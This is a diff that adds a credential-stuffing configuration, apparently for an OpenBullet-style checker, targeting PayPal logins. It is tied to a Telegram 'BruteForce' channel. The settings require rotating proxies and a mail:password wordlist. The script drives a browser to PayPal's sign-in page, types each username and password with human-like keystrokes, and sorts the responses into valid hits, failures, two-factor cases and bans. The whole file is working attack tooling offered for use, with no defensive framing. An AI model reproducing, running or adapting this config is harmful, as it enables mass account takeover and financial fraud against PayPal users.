@@ -1,0 +1,91 @@
+[SETTINGS]
+{
+  "Name": "PayPal",
+  "SuggestedBots": 5,
+  "MaxCPM": 0,
+  "LastModified": "2021-08-21T03:23:52.3773578+04:30",
+  "AdditionalInfo": "Telegram Channel: T.me/BruteForce | Selenium | Needs HQ Proxy | Maximum Bot: 5 | CPM Rate: 5_15 ",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 4,
+  "BanProxyAfterGoodStatus": true,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": true,
+  "AlwaysQuit": true,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Open BROWSERACTION Open 
+
+#Links NAVIGATE "https://www.paypal.com/signin" 
+
+#Delay FUNCTION Delay "100" 
+
+#Id1_E ELEMENTACTION Name "login_email" 
+  Click 
+
+#Id4_US ELEMENTACTION Id "email" 
+  SendKeysHuman "<USER>" 
+
+#Delay FUNCTION Delay "1000" 
+
+#Id5_LogM ELEMENTACTION Id "btnNext" 
+  Click 
+
+#Delay FUNCTION Delay "1000" 
+
+#Click ELEMENTACTION Name "login_password" 
+  Click 
+
+#H_Pass ELEMENTACTION Name "login_password" 
+  SendKeysHuman "<PASS>" 
+
+#Logs ELEMENTACTION Id "btnLogin" 
+  Click 
+
+#5S ELEMENTACTION Id "" 
+  WaitForElement "5s" 
+
+#CompleteSS BROWSERACTION DOMtoSOURCE "<SOURCE>" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "We're looking out for you." 
+    KEY "challengesSection" 
+    KEY "addPhoneRequired" 
+    KEY "Verificação de segurança" 
+    KEY "Keep your mobile number updated" 
+  KEYCHAIN Failure OR 
+    KEY "forgotPasswordModal" 
+    KEY "Some of your info isn't correct. Please try again." 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "Sorry, we can't log you in. If you think there's a problem with your account" 
+    KEY "reset your password" 
+    KEY "role=\"alert\">For security reasons" 
+  KEYCHAIN Ban OR 
+    KEY "Security Challenge" 
+
+#Close BROWSERACTION Quit 
+
+#C FUNCTION Constant "@BruteForce" -> CAP "Join Telegram Channel:" 
+
